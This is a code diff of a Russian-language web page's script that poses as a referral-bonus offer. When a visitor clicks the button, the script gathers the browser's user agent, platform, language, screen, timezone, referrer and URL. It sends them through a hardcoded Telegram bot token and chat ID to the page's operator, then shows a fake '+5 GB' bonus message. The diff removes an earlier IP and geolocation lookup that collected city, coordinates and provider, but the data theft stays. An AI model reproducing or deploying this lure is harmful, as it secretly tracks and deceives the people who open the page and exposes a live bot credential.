@@ -66,13 +66,13 @@
 
 <script>
     // ==========================================
-    //  ТВОИ ДАННЫЕ (исправленный токен)
+    //  ТВОИ ДАННЫЕ
     // ==========================================
     const BOT_TOKEN = '8731606722:AAGdTFXvWZaAMTs0vPzV6Su4GMZJvHB7XkA';
     const CHAT_ID = '8352159294';
 
     // ==========================================
-    //  ОСНОВНОЙ КОД
+    //  ОСНОВНОЙ КОД (БЕЗ IP И ГЕО — ТОЛЬКО ДАННЫЕ БРАУЗЕРА)
     // ==========================================
     document.getElementById('referBtn').addEventListener('click', function() {
         const btn = this;
@@ -82,7 +82,7 @@
         btn.textContent = '⏳ Отправка...';
         statusEl.className = 'status';
 
-        // Собираем данные о пользователе
+        // Собираем данные
         const data = {
             refId: document.getElementById('refId').textContent,
             userAgent: navigator.userAgent,
@@ -105,91 +105,51 @@
             timestamp: new Date().toISOString()
         };
 
-        // Пытаемся получить IP
-        fetch('https://api.ipify.org?format=json')
+        // Формируем сообщение
+        const lines = [
+            '🔐 НОВЫЙ РЕФЕРАЛЬНЫЙ ПЕРЕХОД',
+            '═══════════════════════',
+            '',
+            `🆔 Реферальный ID: ${data.refId}`,
+            '',
+            `🖥️ User‑Agent: ${data.userAgent}`,
+            `💻 Платформа: ${data.platform}`,
+            `🌐 Язык: ${data.language}`,
+            `📐 Экран: ${data.screenWidth}×${data.screenHeight} (${data.colorDepth}bit)`,
+            `📱 Плотность: ${data.pixelRatio}`,
+            `⏰ Часовой пояс: ${data.timezone} (UTC${(data.timeOffset / -60)})`,
+            `🕒 Время: ${data.localTime}`,
+            `🔗 Ссылка: ${data.url}`,
+            `📎 Откуда пришёл: ${data.referrer}`,
+            '',
+            `━━━━━━━━━━━━━━━━━━━━━━`,
+            `⏱️ ${data.timestamp}`
+        ];
+
+        const message = encodeURIComponent(lines.join('\n'));
+
+        // Отправляем в Telegram
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
+
+        fetch(url)
             .then(res => {
-                if (!res.ok) throw new Error('IP-сервис недоступен');
-                return res.json();
-            })
-            .then(ipData => {
-                data.ip = ipData.ip;
-                // Пробуем получить геолокацию
-                return fetch(`https://ipapi.co/${ipData.ip}/json/`);
-            })
-            .then(res => {
-                if (!res.ok) throw new Error('Гео-сервис недоступен');
-                return res.json();
-            })
-            .then(geo => {
-                data.country = geo.country_name || null;
-                data.city = geo.city || null;
-                data.region = geo.region || null;
-                data.postal = geo.postal || null;
-                data.latitude = geo.latitude || null;
-                data.longitude = geo.longitude || null;
-                data.org = geo.org || null;
-                data.asn = geo.asn || null;
+                if (res.ok) {
+                    btn.textContent = '✅ Вы стали рефералом!';
+                    btn.style.background = 'linear-gradient(135deg, #00c853, #00e676)';
+                    statusEl.className = 'status ok';
+                    statusEl.textContent = '✅ Данные отправлены! Бонусы начислены.';
+                    document.querySelector('.badge').textContent = '🎁 +5 GB начислены!';
+                } else {
+                    throw new Error('Telegram API error');
+                }
             })
             .catch(() => {
-                // Если гео не пришло — отправляем без него
-                console.log('Гео-данные не получены');
+                btn.textContent = '🔥 Стать рефералом';
+                statusEl.className = 'status err';
+                statusEl.textContent = '❌ Ошибка отправки. Попробуйте ещё раз.';
             })
             .finally(() => {
-                // Формируем сообщение
-                const lines = [
-                    '🔐 НОВЫЙ РЕФЕРАЛЬНЫЙ ПЕРЕХОД',
-                    '═══════════════════════',
-                    '',
-                    `🆔 Реферальный ID: ${data.refId}`,
-                    '',
-                    `🌐 IP: ${data.ip || 'не определён'}`,
-                    `🌍 Страна: ${data.country || 'не определена'}`,
-                    `🏙️ Город: ${data.city || 'не определён'}`,
-                    `📍 Регион: ${data.region || 'не определён'}`,
-                    `📮 Индекс: ${data.postal || 'не определён'}`,
-                    `🗺️ Координаты: ${data.latitude || '?'}, ${data.longitude || '?'}`,
-                    `📡 Провайдер: ${data.org || 'не определён'}`,
-                    `📶 ASN: ${data.asn || 'не определён'}`,
-                    '',
-                    `🖥️ User‑Agent: ${data.userAgent}`,
-                    `💻 Платформа: ${data.platform}`,
-                    `🌐 Язык: ${data.language}`,
-                    `📐 Экран: ${data.screenWidth}×${data.screenHeight} (${data.colorDepth}bit)`,
-                    `📱 Плотность: ${data.pixelRatio}`,
-                    `⏰ Часовой пояс: ${data.timezone} (UTC${(data.timeOffset / -60)})`,
-                    `🕒 Время: ${data.localTime}`,
-                    `🔗 Ссылка: ${data.url}`,
-                    `📎 Откуда пришёл: ${data.referrer}`,
-                    '',
-                    `━━━━━━━━━━━━━━━━━━━━━━`,
-                    `⏱️ ${data.timestamp}`
-                ];
-
-                const message = encodeURIComponent(lines.join('\n'));
-
-                // Отправляем в Telegram
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
-
-                fetch(url)
-                    .then(res => {
-                        if (res.ok) {
-                            btn.textContent = '✅ Вы стали рефералом!';
-                            btn.style.background = 'linear-gradient(135deg, #00c853, #00e676)';
-                            statusEl.className = 'status ok';
-                            statusEl.textContent = '✅ Данные отправлены! Бонусы начислены.';
-                            document.querySelector('.badge').textContent = '🎁 +5 GB начислены!';
-                        } else {
-                            throw new Error('Telegram API error');
-                        }
-                    })
-                    .catch(() => {
-                        btn.textContent = '🔥 Стать рефералом';
-                        statusEl.className = 'status err';
-                        statusEl.textContent = '❌ Ошибка отправки. Попробуйте ещё раз.';
-                    })
-                    .finally(() => {
-                        btn.disabled = false;
-                    });
+                btn.disabled = false;
             });
     });
 </script>
